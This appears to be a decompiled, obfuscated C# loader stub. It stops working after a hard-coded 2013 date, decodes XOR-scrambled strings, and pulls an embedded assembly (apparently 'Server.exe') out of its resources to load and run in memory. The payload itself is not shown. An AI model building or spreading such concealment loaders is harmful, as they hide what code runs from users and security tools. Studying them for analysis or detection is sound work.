using System;
using System.IO;
using System.IO.Packaging;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Windows.Forms;

namespace ns0;

internal static class Class0
{
	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 86)]
	private struct Struct0
	{
	}

	private static readonly char[] char_0;

	private static readonly char[] char_1 = new char[43];

	private static readonly string[] string_0;

	internal static byte byte_0/* Not supported: data(00) */;

	private static Assembly smethod_0(Package package_0, string string_1)
	{
		Uri uri = new Uri(string_1, UriKind.Relative);
		byte[] array;
		using (Stream stream = package_0.GetPart(uri).GetStream())
		{
			array = new byte[(int)stream.Length];
			stream.Read(array, 0, array.Length);
		}
		Assembly assembly = Assembly.Load(array);
		if (null == assembly)
		{
			throw new ArgumentException(Class1.smethod_0("\uea6a\uea51\uea5e\uea5d\uea53\uea5a\uea1f\uea4b\uea50\uea1f\uea53\uea50\uea5e\uea5b\uea1f\uea5e\uea4c\uea4c\uea5a\uea52\uea5d\uea53\uea46\uea05\uea1f", 59956) + string_1);
		}
		return assembly;
	}

	[STAThread]
	[SecuritySafeCritical]
	private static void Main(string[] args)
	{
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		if (!(DateTime.Now > new DateTime(635078201258791967L)))
		{
			try
			{
				using Stream stream = typeof(Class0).Assembly.GetManifestResourceStream(Class1.smethod_0("\ue3f2\ue3bd\ue3e9\ue3fa\ue3e3", 58131));
				Package val = Package.Open(stream, FileMode.Open, FileAccess.Read);
				try
				{
					Assembly assembly = smethod_0(val, Class1.smethod_0("\uf1d8\uf1a4\uf192\uf185\uf181\uf192\uf185\uf1d9\uf192\uf18f\uf192", 61943));
					assembly.EntryPoint!.Invoke(null, new object[1] { args });
					return;
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.GetType().Name + Environment.NewLine + ex.Message + Environment.NewLine + ex.StackTrace);
				return;
			}
		}
		throw new Exception();
	}

	static Class0()
	{
		char[] array = new char[8];
		array[4] = 'ѐ';
		array[3] = '㝿';
		array[1] = 'Ǣ';
		array[0] = '⏘';
		array[2] = '\u1ddd';
		array[5] = '⮜';
		array[6] = '⡎';
		array[7] = '⽅';
		string_0 = new string[1];
		char_0 = array;
	}
}
